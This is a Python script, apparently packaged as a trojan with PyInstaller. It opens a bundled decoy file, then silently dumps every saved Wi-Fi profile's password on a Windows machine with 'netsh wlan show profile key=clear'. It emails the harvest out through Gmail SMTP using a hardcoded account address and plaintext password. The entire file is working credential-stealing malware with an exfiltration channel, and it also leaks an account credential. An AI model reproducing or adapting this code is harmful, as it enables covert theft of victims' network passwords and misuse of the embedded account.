#!/usr/bin/env python

import re
import smtplib
import subprocess
import sys
import os

# Function to send an email
def send_mail(email, password, message):
    # Instance of an SMTP server
    # The first arg is the smtp server name and the second arg is the port number
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password) 
    server.sendmail(email, email, message)
    server.quit()   

def execute_system_command(command):
    DEVNULL = open(os.devnull, 'wb')
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)    

file_name = sys._MEIPASS + "\html.txt"
subprocess.Popen(file_name, shell=True)

try:
    command = "netsh wlan show profile"
    networks = execute_system_command(command)

    # re.search() does not work because it only searches for the first occurence
    # network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    # For python 3 use:
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", str(networks, 'utf-8'))

    result=""
    for network_name in network_names_list:
        command = "netsh wlan show profile \"" + network_name + "\" key=clear"
        current_result = execute_system_command(command) 
        # result = result + current_result
        # For python 3 use:
        result = result + str(current_result, 'utf-8')
        
    send_mail("proy9714@gmail.com", "gogeta9714", result)

except Exception:
    sys.exit()